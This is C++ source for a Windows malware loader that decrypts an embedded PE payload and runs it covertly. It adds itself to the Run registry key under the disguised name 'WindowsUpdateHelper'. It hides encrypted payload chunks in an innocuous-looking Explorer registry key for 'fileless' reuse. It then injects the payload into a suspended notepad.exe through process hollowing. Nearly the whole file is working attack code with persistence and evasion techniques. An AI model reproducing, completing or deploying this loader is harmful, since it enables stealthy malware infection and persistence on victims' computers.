#include <windows.h>
#include <cstdint>
#include <vector>
#include <wincrypt.h>
#include <cstdio>
#include <string>
#include <algorithm>
#pragma comment(lib, "advapi32.lib")

#pragma pack(push, 1)
struct PayloadIndex {
    uint32_t magic;
    uint8_t  first_key;
    uint32_t total_size;
    uint16_t chunk_count;
    uint16_t first_chunk_id;
    uint32_t crc32;
};
#pragma pack(pop)

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

// DEBUG MACRO — FULLY WORKING
void D(const char* msg, const char* title = "DEBUG") {
    MessageBoxA(NULL, msg, title, MB_OK);
}

// Resource loader
unsigned char* LoadResourceByID(int id, DWORD* size) {
    HMODULE hMod = GetModuleHandle(NULL);
    HRSRC hRes = FindResourceA(hMod, MAKEINTRESOURCEA(id), "RCDATA");
    if (!hRes) return nullptr;
    HGLOBAL hGlob = LoadResource(hMod, hRes);
    if (!hGlob) return nullptr;
    *size = SizeofResource(hMod, hRes);
    return (unsigned char*)LockResource(hGlob);
}

uint32_t CalculateCRC32(const char* data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= (uint32_t)(unsigned char)data[i];
        for (int j = 0; j < 8; j++)
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
    }
    return ~crc;
}

bool VerifyPayload(const std::vector<char>& payload, uint32_t expected_crc, uint32_t expected_size) {
    char buf[256];
    sprintf_s(buf, "Expected: %u bytes, Got: %zu bytes", expected_size, payload.size());
    D(buf, "SIZE CHECK");
    
    if (payload.size() != expected_size) { 
        sprintf_s(buf, "Size mismatch! Expected: %u, Got: %zu", expected_size, payload.size());
        D(buf, "ERROR"); 
        return false; 
    }
    if (payload[0] != 'M' || payload[1] != 'Z') { 
        D("Invalid PE signature!", "ERROR"); 
        return false; 
    }
    if (CalculateCRC32(payload.data(), payload.size()) != expected_crc) { 
        D("CRC failed!", "ERROR"); 
        return false; 
    }
    D("Payload verification OK", "SUCCESS");
    return true;
}

// ====================================================================
// REGISTRY PERSISTENCE FUNCTIONS - MONKE EDITION 🐒
// ====================================================================

bool IsInAutorun() {
    HKEY hKey;
    wchar_t modulePath[MAX_PATH];
    GetModuleFileNameW(NULL, modulePath, MAX_PATH);
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        wchar_t regPath[MAX_PATH];
        DWORD size = sizeof(regPath);
        bool found = false;
        
        if (RegQueryValueExW(hKey, L"WindowsUpdateHelper", NULL, NULL, 
                            (LPBYTE)regPath, &size) == ERROR_SUCCESS) {
            found = (wcsstr(regPath, modulePath) != NULL);
        }
        
        RegCloseKey(hKey);
        return found;
    }
    return false;
}

bool AddToAutorun() {
    if (IsInAutorun()) {
        return true;
    }
    
    wchar_t modulePath[MAX_PATH];
    GetModuleFileNameW(NULL, modulePath, MAX_PATH);
    
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        
        std::wstring value = L"\"" + std::wstring(modulePath) + L"\"";
        BOOL success = (RegSetValueExW(hKey, L"WindowsUpdateHelper", 0, REG_SZ,
                          (BYTE*)value.c_str(), 
                          (DWORD)(value.length() * sizeof(wchar_t))) == ERROR_SUCCESS);
        
        RegCloseKey(hKey);
        
        if (success) {
            D("Added to autorun for persistence", "PERSISTENCE");
        }
        return success;
    }
    return false;
}

bool RegistryFragmentsExist() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, 
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\CIDSizeMRU", 
        0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return false;
    }
    
    std::wstring indexName = L"Explorer.exe";
    DWORD size = 0;
    bool indexExists = (RegQueryValueExW(hKey, indexName.c_str(), NULL, NULL, NULL, &size) == ERROR_SUCCESS);
    
    RegCloseKey(hKey);
    return indexExists;
}

// MONKE STORE ENCRYPTED FRAGMENTS IN REGISTRY 🍌
bool StoreFragmentsInRegistry(const PayloadIndex& index, const std::vector<std::vector<BYTE>>& encryptedChunks) {
    HKEY hKey;
    DWORD disposition;
    
    if (RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\CIDSizeMRU",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, &disposition) != ERROR_SUCCESS) {
        D("Failed to create registry key", "REGISTRY STORE FAIL");
        return false;
    }
    
    // Store index with name that blends in
    std::wstring indexName = L"Explorer.exe";
    if (RegSetValueExW(hKey, indexName.c_str(), 0, REG_BINARY, 
                   (BYTE*)&index, sizeof(PayloadIndex)) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        D("Failed to store index in registry", "REGISTRY STORE FAIL");
        return false;
    }
    
    // Store encrypted chunks
    for (size_t i = 0; i < encryptedChunks.size(); ++i) {
        std::wstring chunkName = L"item" + std::to_wstring(i);
        if (RegSetValueExW(hKey, chunkName.c_str(), 0, REG_BINARY,
                       encryptedChunks[i].data(), (DWORD)encryptedChunks[i].size()) != ERROR_SUCCESS) {
            RegCloseKey(hKey);
            D("Failed to store chunk in registry", "REGISTRY STORE FAIL");
            return false;
        }
    }
    
    RegCloseKey(hKey);
    D("Encrypted fragments stored in registry for future", "REGISTRY STORE SUCCESS");
    return true;
}

// MONKE LOAD ENCRYPTED FRAGMENTS FROM REGISTRY 🍌
std::vector<char> LoadFragmentsFromRegistry() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\CIDSizeMRU",
        0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return {};
    }
    
    // Load index
    std::wstring indexName = L"Explorer.exe";
    DWORD size = sizeof(PayloadIndex);
    PayloadIndex index;
    
    if (RegQueryValueExW(hKey, indexName.c_str(), NULL, NULL, (BYTE*)&index, &size) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return {};
    }
    
    if (index.magic != 0xCAFEBABE) {
        RegCloseKey(hKey);
        return {};
    }
    
    // Load encrypted chunks from registry
    std::vector<std::vector<BYTE>> encryptedChunks;
    for (int i = 0; i < index.chunk_count; ++i) {
        std::wstring chunkName = L"item" + std::to_wstring(i);
        DWORD chunkSize = 0;
        
        if (RegQueryValueExW(hKey, chunkName.c_str(), NULL, NULL, NULL, &chunkSize) == ERROR_SUCCESS) {
            std::vector<BYTE> encryptedChunk(chunkSize);
            if (RegQueryValueExW(hKey, chunkName.c_str(), NULL, NULL, encryptedChunk.data(), &chunkSize) == ERROR_SUCCESS) {
                encryptedChunks.push_back(std::move(encryptedChunk));
            }
        }
    }
    
    RegCloseKey(hKey);
    
    if (encryptedChunks.size() != index.chunk_count) {
        return {};
    }
    
    // DECRYPT THE FRAGMENTS MONKE STYLE 🐒
    char buf[512];
    std::vector<char> payload;
    payload.reserve(index.total_size + 1024);

    HCRYPTPROV hProv = 0;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        D("CryptAcquireContext failed", "FATAL");
        return {};
    }

    BYTE aes_key[32] = {0};
    for (int i = 0; i < 32; i++) aes_key[i] = index.first_key ^ (i * 0x11);
    BYTE last_cipher_block[16] = {0};

    for (int i = 0; i < index.chunk_count; ++i) {
        if (i >= encryptedChunks.size()) {
            sprintf_s(buf, "Missing chunk %d", i);
            D(buf, "FATAL");
            CryptReleaseContext(hProv, 0);
            return {};
        }

        const auto& encrypted_data = encryptedChunks[i];
        DWORD chunk_size = (DWORD)encrypted_data.size();

        sprintf_s(buf, "Registry Chunk %d: Size: %u bytes", i, chunk_size);
        D(buf, "LOADING");

        // IV handling - SAME AS YOUR EXISTING LOGIC
        BYTE iv[16] = {0};
        if (i > 0) {
            memcpy(iv, last_cipher_block, 16);
        }

        // Import key - SAME AS YOUR EXISTING LOGIC
        struct {
            BLOBHEADER hdr;
            DWORD      dwKeySize;
            BYTE       key[32];
        } keyblob = {0};

        keyblob.hdr.bType    = PLAINTEXTKEYBLOB;
        keyblob.hdr.bVersion = CUR_BLOB_VERSION;
        keyblob.hdr.reserved = 0;
        keyblob.hdr.aiKeyAlg = CALG_AES_256;
        keyblob.dwKeySize    = 32;
        memcpy(keyblob.key, aes_key, 32);

        HCRYPTKEY hKey = 0;
        if (!CryptImportKey(hProv, (BYTE*)&keyblob, sizeof(keyblob), 0, 0, &hKey)) {
            sprintf_s(buf, "Key import failed for chunk %d", i);
            D(buf, "CRYPTO ERROR");
            CryptReleaseContext(hProv, 0);
            return {};
        }

        if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
            sprintf_s(buf, "IV set failed for chunk %d", i);
            D(buf, "CRYPTO ERROR");
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return {};
        }

        // Copy encrypted data - SAME AS YOUR EXISTING LOGIC
        std::vector<BYTE> decrypted(chunk_size);
        memcpy(decrypted.data(), encrypted_data.data(), chunk_size);
        DWORD out_len = chunk_size;

        // CRITICAL FIX: Use FALSE for all chunks, handle padding manually - SAME AS YOURS
        if (!CryptDecrypt(hKey, 0, FALSE, 0, decrypted.data(), &out_len)) {
            sprintf_s(buf, "Decrypt failed! Error: 0x%08X (chunk %d)", GetLastError(), i);
            D(buf, "CRYPTO ERROR");
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return {};
        }

        CryptDestroyKey(hKey);

        // Store last ciphertext block for next IV - SAME AS YOUR EXISTING LOGIC
        if (chunk_size >= 16) {
            memcpy(last_cipher_block, encrypted_data.data() + chunk_size - 16, 16);
        } else {
            memcpy(last_cipher_block, encrypted_data.data(), chunk_size);
            memset(last_cipher_block + chunk_size, 0, 16 - chunk_size);
        }

        // Remove PKCS7 padding MANUALLY from ALL chunks - SAME AS YOUR EXISTING LOGIC
        if (out_len > 0) {
            BYTE pad = decrypted[out_len - 1];
            if (pad >= 1 && pad <= 16) {
                bool valid = true;
                for (int j = 0; j < pad; ++j) {
                    if (decrypted[out_len - 1 - j] != pad) {
                        valid = false;
                        break;
                    }
                }
                if (valid) {
                    out_len -= pad;
                }
            }
        }

        payload.insert(payload.end(), (char*)decrypted.data(), (char*)decrypted.data() + out_len);
        
        sprintf_s(buf, "Registry Chunk %d decrypted: %u -> %u bytes", i, chunk_size, out_len);
        D(buf, "SUCCESS");
    }

    CryptReleaseContext(hProv, 0);

    // Final verification - SAME AS YOUR EXISTING LOGIC
    sprintf_s(buf, "Final reconstructed from registry: %zu bytes\nExpected: %u bytes", 
              payload.size(), index.total_size);
    D(buf, "RECONSTRUCTION");

    if (!VerifyPayload(payload, index.crc32, index.total_size)) {
        D("Final verification failed!", "FATAL");
        return {};
    }

    D("FULL DECRYPTION SUCCESS FROM REGISTRY", "VICTORY");
    return payload;
}

// MONKE GET ENCRYPTED FRAGMENTS FROM RESOURCES 🍌
std::pair<PayloadIndex, std::vector<std::vector<BYTE>>> LoadEncryptedFragmentsFromResources() {
    DWORD indexSize = 0;
    unsigned char* indexData = LoadResourceByID(999, &indexSize);
    if (!indexData || indexSize < sizeof(PayloadIndex)) {
        return {};
    }

    PayloadIndex* idx = (PayloadIndex*)indexData;
    if (idx->magic != 0xCAFEBABE) {
        return {};
    }

    std::vector<std::vector<BYTE>> encryptedChunks;
    
    // Load encrypted chunks WITHOUT decrypting
    for (int i = 0; i < idx->chunk_count; ++i) {
        int resId = idx->first_chunk_id + i;
        DWORD chunk_size = 0;
        unsigned char* encrypted_data = LoadResourceByID(resId, &chunk_size);
        
        if (encrypted_data && chunk_size > 0) {
            std::vector<BYTE> chunk(encrypted_data, encrypted_data + chunk_size);
            encryptedChunks.push_back(chunk);
        }
    }

    return {*idx, encryptedChunks};
}

// MONKE SMART RECONSTRUCTION - REGISTRY FIRST! 🐒
std::vector<char> ReconstructFragmentsWithRegistryPersistence() {
    // STEP 1: Ensure monke persists
    if (!IsInAutorun()) {
        AddToAutorun();
    }
    
    // STEP 2: Check if fragments already in registry
    if (RegistryFragmentsExist()) {
        D("Found existing fragments in registry, using them!", "REGISTRY MODE");
        auto registryPayload = LoadFragmentsFromRegistry();
        if (!registryPayload.empty()) {
            D("Successfully loaded from registry (fileless mode)", "REGISTRY SUCCESS");
            return registryPayload;
        }
        D("Registry load failed, falling back to resources", "REGISTRY FAIL");
    }
    
    // STEP 3: Load from resources, STORE in registry, then decrypt
    D("No fragments in registry, loading from resources...", "RESOURCE MODE");
    
    // Get encrypted fragments from resources
    auto [index, encryptedChunks] = LoadEncryptedFragmentsFromResources();
    
    if (!encryptedChunks.empty()) {
        // STORE ENCRYPTED FRAGMENTS IN REGISTRY FOR NEXT TIME
        StoreFragmentsInRegistry(index, encryptedChunks);
        
        // Now decrypt them (using same logic as registry decryption)
        char buf[512];
        std::vector<char> payload;
        payload.reserve(index.total_size + 1024);

        HCRYPTPROV hProv = 0;
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            D("CryptAcquireContext failed", "FATAL");
            return {};
        }

        BYTE aes_key[32] = {0};
        for (int i = 0; i < 32; i++) aes_key[i] = index.first_key ^ (i * 0x11);
        BYTE last_cipher_block[16] = {0};

        for (int i = 0; i < index.chunk_count; ++i) {
            const auto& encrypted_data = encryptedChunks[i];
            DWORD chunk_size = (DWORD)encrypted_data.size();

            sprintf_s(buf, "Resource Chunk %d: Size: %u bytes", i, chunk_size);
            D(buf, "LOADING");

            // Your existing decryption logic...
            BYTE iv[16] = {0};
            if (i > 0) {
                memcpy(iv, last_cipher_block, 16);
            }

            struct {
                BLOBHEADER hdr;
                DWORD      dwKeySize;
                BYTE       key[32];
            } keyblob = {0};

            keyblob.hdr.bType    = PLAINTEXTKEYBLOB;
            keyblob.hdr.bVersion = CUR_BLOB_VERSION;
            keyblob.hdr.reserved = 0;
            keyblob.hdr.aiKeyAlg = CALG_AES_256;
            keyblob.dwKeySize    = 32;
            memcpy(keyblob.key, aes_key, 32);

            HCRYPTKEY hKey = 0;
            if (!CryptImportKey(hProv, (BYTE*)&keyblob, sizeof(keyblob), 0, 0, &hKey)) {
                CryptReleaseContext(hProv, 0);
                return {};
            }

            if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
                CryptDestroyKey(hKey);
                CryptReleaseContext(hProv, 0);
                return {};
            }

            std::vector<BYTE> decrypted(chunk_size);
            memcpy(decrypted.data(), encrypted_data.data(), chunk_size);
            DWORD out_len = chunk_size;

            if (!CryptDecrypt(hKey, 0, FALSE, 0, decrypted.data(), &out_len)) {
                CryptDestroyKey(hKey);
                CryptReleaseContext(hProv, 0);
                return {};
            }

            CryptDestroyKey(hKey);

            if (chunk_size >= 16) {
                memcpy(last_cipher_block, encrypted_data.data() + chunk_size - 16, 16);
            }

            if (out_len > 0) {
                BYTE pad = decrypted[out_len - 1];
                if (pad >= 1 && pad <= 16) {
                    bool valid = true;
                    for (int j = 0; j < pad; ++j) {
                        if (decrypted[out_len - 1 - j] != pad) {
                            valid = false;
                            break;
                        }
                    }
                    if (valid) {
                        out_len -= pad;
                    }
                }
            }

            payload.insert(payload.end(), (char*)decrypted.data(), (char*)decrypted.data() + out_len);
        }

        CryptReleaseContext(hProv, 0);

        if (VerifyPayload(payload, index.crc32, index.total_size)) {
            return payload;
        }
    }
    
    return {};
}

// ====================================================================
// EXISTING HOLLOWING CODE - UNCHANGED
// ====================================================================
bool ValidateAndExecutePayload(char* payload, uint32_t payloadSize) {
    // ... your existing hollowing code remains exactly the same ...
    // Validate PE header (MZ)
    if (payload[0] != 'M' || payload[1] != 'Z') {
        MessageBoxA(NULL, "[!] Invalid PE signature after decryption.", "Error", MB_ICONERROR);
        return false;
    }

    // Parse PE headers
    BYTE* pe = (BYTE*)payload;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe;
    
    // Check if e_lfanew is valid
    if (dos->e_lfanew < sizeof(IMAGE_DOS_HEADER) || dos->e_lfanew > payloadSize - sizeof(IMAGE_NT_HEADERS64)) {
        MessageBoxA(NULL, "[!] Invalid PE header offset.", "Error", MB_ICONERROR);
        return false;
    }
    
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);

    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        MessageBoxA(NULL, "[!] NT signature invalid.", "Error", MB_ICONERROR);
        return false;
    }

    // Create suspended target process (notepad.exe)
    PROCESS_INFORMATION pi;
    STARTUPINFOA si = { sizeof(si) };
    char cmdLine[] = "C:\\Windows\\System32\\notepad.exe";

    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        MessageBoxA(NULL, "[!] Failed to create target process.", "Error", MB_ICONERROR);
        return false;
    }

    // ... rest of your existing hollowing code ...
    // Prepare to modify thread context
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL | CONTEXT_INTEGER | CONTEXT_CONTROL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        MessageBoxA(NULL, "[!] GetThreadContext failed.", "Error", MB_ICONERROR);
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // Attempt to allocate memory at original ImageBase first
    LPVOID remoteImage = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)nt->OptionalHeader.ImageBase,
        nt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // Fallback: allocate anywhere if base is already taken
    if (!remoteImage) {
        remoteImage = VirtualAllocEx(pi.hProcess, NULL,
            nt->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        if (!remoteImage) {
            MessageBoxA(NULL, "[!] VirtualAllocEx failed.", "Error", MB_ICONERROR);
            TerminateProcess(pi.hProcess, 0);
            return false;
        }

        // Adjust ImageBase in PE headers
        nt->OptionalHeader.ImageBase = (ULONGLONG)remoteImage;
    }

    ULONGLONG originalImageBase = nt->OptionalHeader.ImageBase;
    ULONGLONG delta = (ULONGLONG)remoteImage - originalImageBase;

    if (delta != 0 && nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        IMAGE_DATA_DIRECTORY relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(pe + relocDir.VirtualAddress);
        SIZE_T processed = 0;

        while (processed < relocDir.Size) {
            DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* relocData = (WORD*)(reloc + 1);

            for (DWORD i = 0; i < count; ++i) {
                DWORD type = relocData[i] >> 12;
                DWORD offset = relocData[i] & 0xFFF;

                if (type == IMAGE_REL_BASED_DIR64) {
                    ULONGLONG* patchAddr = (ULONGLONG*)(pe + reloc->VirtualAddress + offset);
                    *patchAddr += delta;
                }
            }

            processed += reloc->SizeOfBlock;
            reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
        }

        // Set the new base AFTER relocations
        nt->OptionalHeader.ImageBase = (ULONGLONG)remoteImage;
    }

    // Write headers
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteImage, pe, nt->OptionalHeader.SizeOfHeaders, &written)) {
        MessageBoxA(NULL, "[!] Failed to write PE headers.", "Error", MB_ICONERROR);
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // Write sections
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        LPVOID dest = (BYTE*)remoteImage + sections[i].VirtualAddress;
        LPVOID src = pe + sections[i].PointerToRawData;
        SIZE_T sectionSize = std::max(sections[i].SizeOfRawData, sections[i].Misc.VirtualSize);

        // Ensure we don't read beyond payload bounds
        if ((BYTE*)src + sections[i].SizeOfRawData > (BYTE*)payload + payloadSize) {
            MessageBoxA(NULL, "[!] Section data out of bounds.", "Error", MB_ICONERROR);
            TerminateProcess(pi.hProcess, 0);
            return false;
        }

        BYTE* padded = new BYTE[sectionSize];
        ZeroMemory(padded, sectionSize);
        memcpy(padded, src, sections[i].SizeOfRawData);

        if (!WriteProcessMemory(pi.hProcess, dest, padded, sectionSize, &written)) {
            delete[] padded;
            MessageBoxA(NULL, "[!] Failed to write section.", "Error", MB_ICONERROR);
            TerminateProcess(pi.hProcess, 0);
            return false;
        }
        delete[] padded;
    }

    // PEB update – dynamic resolve
    using pNtQuery = NTSTATUS(NTAPI*)(HANDLE, int, PVOID, ULONG, PULONG);
    static pNtQuery pNt = nullptr;
    if (!pNt) {
        pNt = (pNtQuery)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
        if (!pNt) {
            TerminateProcess(pi.hProcess, 0);
            return false;
        }
    }

    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG returnLength = 0;
    if (pNt(pi.hProcess, 0, &pbi, sizeof(pbi), &returnLength) != 0) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    PVOID pebBase = (BYTE*)pbi.PebBaseAddress + 0x10;
    WriteProcessMemory(pi.hProcess, pebBase, &nt->OptionalHeader.ImageBase, sizeof(ULONGLONG), NULL);
    
    // Set RIP to new PE entry point
    ctx.Rip = (ULONGLONG)remoteImage + nt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);

    // Flush instruction cache and resume
    FlushInstructionCache(pi.hProcess, remoteImage, nt->OptionalHeader.SizeOfImage);
    ResumeThread(pi.hThread);

    // Clean up handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}

// ====================================================================
// WinMain - MONKE EDITION 🐒
// ====================================================================
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // Use the smart registry-persistent loader
    auto payload = ReconstructFragmentsWithRegistryPersistence();
    if (payload.empty()) {
        D("Reconstruction failed", "FATAL");
        return -1;
    }
    D("Starting hollowing...", "HOLLOW");
    if (!ValidateAndExecutePayload(payload.data(), (uint32_t)payload.size())) {
        D("Hollowing failed", "FATAL");
        return -1;
    }
    D("Payload executed successfully", "DONE");
    return 0;
}